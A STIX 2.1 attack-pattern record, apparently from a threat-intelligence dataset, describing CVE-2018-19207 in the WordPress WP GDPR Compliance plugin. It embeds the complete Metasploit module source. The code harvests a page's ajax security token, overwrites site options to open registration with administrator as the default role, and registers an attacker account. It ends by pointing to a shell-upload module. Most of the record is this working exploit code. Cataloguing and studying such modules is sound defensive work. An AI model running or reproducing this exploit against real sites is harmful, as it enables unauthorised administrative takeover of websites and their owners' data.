{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a100d269-81b6-49f6-8c67-ff1d248c707f",
    "created": "2024-08-14T16:24:03.524854Z",
    "modified": "2024-08-14T16:24:03.524858Z",
    "name": "WordPress WP GDPR Compliance Plugin Privilege Escalation",
    "description": " The Wordpress GDPR Compliance plugin <= v1.4.2 allows unauthenticated users to set wordpress administration options by overwriting values within the database.  The vulnerability is present in WordPress\u2019s admin-ajax.php, which allows unauthorized users to trigger handlers and make configuration changes because of a failure to do capability checks when executing the 'save_setting' internal action.  WARNING: The module sets Wordpress configuration options without reading their current values and restoring them later. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_gdpr_compliance_privesc.rb",
            "external_id": "wp_gdpr_compliance_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-19207"
        },
        {
            "source_name": "WPVDB",
            "external_id": "9144"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress WP GDPR Compliance Plugin Privilege Escalation',\n        'Description' => %q{\n          The Wordpress GDPR Compliance plugin <= v1.4.2 allows unauthenticated users to set\n          wordpress administration options by overwriting values within the database.\n\n          The vulnerability is present in WordPress\u2019s admin-ajax.php, which allows unauthorized\n          users to trigger handlers and make configuration changes because of a failure to do\n          capability checks when executing the 'save_setting' internal action.\n\n          WARNING: The module sets Wordpress configuration options without reading their current\n          values and restoring them later.\n        },\n        'Author' => [\n          'Mikey Veenstra (WordFence)', # Vulnerability discovery\n          'Thomas Labadie' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/'],\n          ['CVE', '2018-19207'],\n          ['WPVDB', '9144']\n        ],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES]\n        },\n        'DisclosureDate' => '2018-11-08'\n      )\n    )\n\n    register_options [\n      OptString.new('EMAIL', [true, 'Email for registration', nil]),\n      OptString.new('USER', [true, 'Username for registration', 'msfuser'])\n    ]\n\n    register_advanced_options [\n      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil])\n    ]\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-gdpr-compliance', '1.4.3')\n  end\n\n  def set_wp_option(name, value, ajax_security)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => wordpress_url_admin_ajax,\n      'vars_post' => {\n        'action' => 'wpgdprc_process_action',\n        'security' => ajax_security,\n        'data' => \"{\\\"type\\\":\\\"save_setting\\\",\\\"append\\\":false,\\\"option\\\":\\\"#{name}\\\",\\\"value\\\":\\\"#{value}\\\"}\"\n      }\n    )\n\n    res && res.code == 200\n  end\n\n  def run\n    print_status('Getting security token from host...')\n    wp_home_res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => target_uri.path\n    )\n\n    unless wp_home_res && wp_home_res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unable to access Wordpress: #{target_uri.path}\")\n    end\n\n    ajax_security = wp_home_res.body[/\"ajaxSecurity\":\"([a-zA-Z0-9]+)\"/i, 1]\n\n    if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)\n      print_warning(\"Changing admin e-mail address to #{datastore['WPEMAIL']}...\")\n      unless set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security)\n        print_error('Failed to change the admin e-mail address')\n        return\n      end\n    end\n\n    print_warning('Enabling user registrations...')\n    unless set_wp_option('users_can_register', '1', ajax_security)\n      print_error('Failed to enable user registrations')\n      return\n    end\n\n    print_warning('Setting the default user role type to administrator...')\n    unless set_wp_option('default_role', 'administrator', ajax_security)\n      print_error('Failed to set the default user role')\n      return\n    end\n\n    print_status(\"Registering #{datastore['USER']} with email #{datastore['EMAIL']}\")\n    unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])\n      print_error('Failed to register user')\n      return\n    end\n\n    vprint_good('For a shell: use exploits/unix/webapp/wp_admin_shell_upload')\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-11-08"
}